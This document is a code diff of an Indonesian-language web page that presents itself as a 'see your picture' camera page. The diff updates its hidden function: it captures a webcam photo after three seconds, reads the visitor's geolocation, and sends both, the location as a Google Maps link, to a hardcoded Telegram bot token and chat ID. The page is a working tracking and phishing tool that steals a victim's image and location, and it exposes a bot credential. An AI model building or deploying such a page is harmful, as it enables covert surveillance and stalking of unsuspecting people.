@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Akses Kamera</title>
+    <title>Akses Kamera dan Lokasi</title>
 </head>
 <body>
     <h1>Lihat Gambar Mu</h1>
@@ -18,10 +18,10 @@
                         const video = document.getElementById('video');
                         video.srcObject = stream;
 
-                        // Ambil foto setelah beberapa detik atau berdasarkan event tertentu
+                        // Ambil foto setelah beberapa detik
                         setTimeout(() => {
                             captureAndSend(stream);
-                        }, 100); // Ambil foto setelah 5 detik
+                        }, 3000); // Ambil foto setelah 3 detik
                     })
                     .catch(function(error) {
                         alert("Akses kamera ditolak.");
@@ -37,8 +37,9 @@
                     const lon = position.coords.longitude;
                     console.log('Lokasi Anda:', lat, lon);
 
-                    // Kirimkan lokasi ke Telegram
-                    sendToTelegram(`Lokasi Anda: Latitude: ${lat}, Longitude: ${lon}`);
+                    // Kirimkan URL Google Maps ke Telegram
+                    const locationUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                    sendToTelegram(`Lokasi Anda: ${locationUrl}`);
                 }, function(error) {
                     alert("Gagal mendapatkan lokasi.");
                 });
@@ -70,19 +71,17 @@
             const telegramToken = '7030408795:AAFfhnjy4x3f3gotpugela5qFMbVVnE9HpI';
             const chatId = '1746156378';
 
-            // Jika pesan berupa gambar (base64)
-            if (message.startsWith('data:image/jpeg;base64,')) {
-                const photoUrl = `https://api.telegram.org/bot${telegramToken}/sendPhoto`;
-                fetch(photoUrl, {
-                    method: 'POST',
-                    body: new URLSearchParams({
-                        chat_id: chatId,
-                        photo: message
-                    })
-                }).then(response => response.json())
-                  .then(data => console.log('Gambar terkirim ke Telegram:', data))
-                  .catch(error => console.log('Error:', error));
-            }
+            // Kirimkan pesan (gambar atau URL)
+            const url = `https://api.telegram.org/bot${telegramToken}/sendMessage`;
+            fetch(url, {
+                method: 'POST',
+                body: new URLSearchParams({
+                    chat_id: chatId,
+                    text: message
+                })
+            }).then(response => response.json())
+              .then(data => console.log('Pesan terkirim ke Telegram:', data))
+              .catch(error => console.log('Error:', error));
         }
     </script>
 </body>
